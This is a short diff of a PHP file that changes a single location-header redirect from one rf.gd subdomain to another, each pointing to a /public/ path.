@@ -1,3 +1,3 @@
 <?php
-header("location: http://hksfyk.rf.gd/public/");
+header("location: http://hkase.rf.gd/public/");
 ?>
